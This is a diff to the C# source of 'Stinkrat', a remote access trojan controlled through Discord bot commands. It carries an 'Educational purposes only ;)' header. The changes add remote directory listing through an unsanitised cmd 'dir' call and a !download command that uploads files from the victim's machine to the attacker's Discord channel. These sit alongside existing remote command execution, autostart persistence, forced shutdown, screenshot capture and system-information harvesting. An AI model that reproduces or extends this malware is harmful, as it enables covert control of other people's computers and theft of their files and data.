@@ -1,5 +1,5 @@
-// Educational purposes only
-// Stinkrat 1.2.(1)
+// Educational purposes only ;)
+// Stinkrat 1.3
 using Discord;
 using Discord.WebSocket;
 using System.Diagnostics;
@@ -19,6 +19,8 @@ using Rectangle = System.Drawing.Rectangle;
     - Fake notification sound (!notification)
     - Spam terminal windows (!terminals)
     - Take a screenshot (!screenshot)
+    - See files (!ls <directory>), e.g. !ls C:\Users\<username>\Downloads
+    - Download files (!download <file>), e.g. !ls C:\Users\<username>\Downloads\image.png
     - Autostarts when they boot up too
 */
 
@@ -81,7 +83,7 @@ namespace App
 
         public static void Shutdown()
         {
-            Process.Start("cmd.exe", "/C shutdown /s");
+            Process.Start("cmd.exe", "/C shutdown /p");
         }
 
         public static void StartUpPrograms()
@@ -113,6 +115,24 @@ namespace App
         public static string FullDeviceInfo()
         {
             var processInfo = new ProcessStartInfo("cmd.exe", "/c systeminfo")
+            {
+                CreateNoWindow = true,
+                UseShellExecute = false,
+                RedirectStandardError = true,
+                RedirectStandardOutput = true,
+                WorkingDirectory = @"C:\Windows\System32\"
+            };
+            System.Text.StringBuilder sb = new System.Text.StringBuilder();
+            Process? p = Process.Start(processInfo);
+            p!.OutputDataReceived += (sender, args) => sb.AppendLine(args.Data);
+            p.BeginOutputReadLine();
+            p.WaitForExit();
+            return sb.ToString();
+        }
+
+        public static string ListDirectory(string directory)
+        {
+            var processInfo = new ProcessStartInfo("cmd.exe", $"/c dir {directory}")
             {
                 CreateNoWindow = true,
                 UseShellExecute = false,
@@ -185,44 +205,51 @@ namespace App
             {
                 // should replace this with a switch statement soon
                 if (message.Content == "!info")
-                {
                     await message.Channel.SendMessageAsync($"**```{RAT.SystemInfo()}```**");
-                }
 
                 if (message.Content.StartsWith("!message"))
-                {
                     RAT.ShowMessage(message.Content.Trim().Replace("!message", ""));
-                }
 
                 if (message.Content.StartsWith("!website"))
-                {
                     RAT.OpenURL(message.Content.Trim().Replace("!website", ""));
-                }
 
                 if (message.Content == "!processes")
-                {
                     await message.Channel.SendMessageAsync($"**TASKS**\n**```{RAT.LogTasks()}```**");
-                }
 
                 if (message.Content.StartsWith("!execute"))
-                {
                     RAT.Execute(message.Content.Trim().Replace("!execute", ""));
+
+                if (message.Content.StartsWith("!ls")) 
+                {
+                    string args = message.Content.Replace("!ls", "").Trim();
+                    // if no args
+                    if (args == "") 
+                    {
+                        await message.Channel.SendMessageAsync(@"Please input a path first (e.g. C:\Users\user\Downloads)");
+                        return;
+                    }
+                    // split the directory contents into 2000 character messages cunks
+                    string str = RAT.ListDirectory(message.Content.Replace("!ls", "").Trim());
+                    int chunkSize = 1990;
+                    int stringLength = str.Length;
+                    for (int i = 0; i < stringLength; i += chunkSize)
+                    {
+                        if (i + chunkSize > stringLength) chunkSize = stringLength - i;
+                        await message.Channel.SendMessageAsync($"```{str.Substring(i, chunkSize)}```");
+                    }
                 }
+
+                if (message.Content.StartsWith("!download"))
+                    await message.Channel.SendFileAsync(@""+message.Content.Replace("!download", "").Trim());
 
                 if (message.Content == "!shutdown")
-                {
                     RAT.Shutdown();
-                }
 
                 if (message.Content == "!notification")
-                {
                     System.Media.SystemSounds.Exclamation.Play();
-                }
 
                 if (message.Content == "!terminals")
-                {
                     RAT.SpamTerminalWindows();
-                }
 
                 if (message.Content == "!fullinfo")
                 {
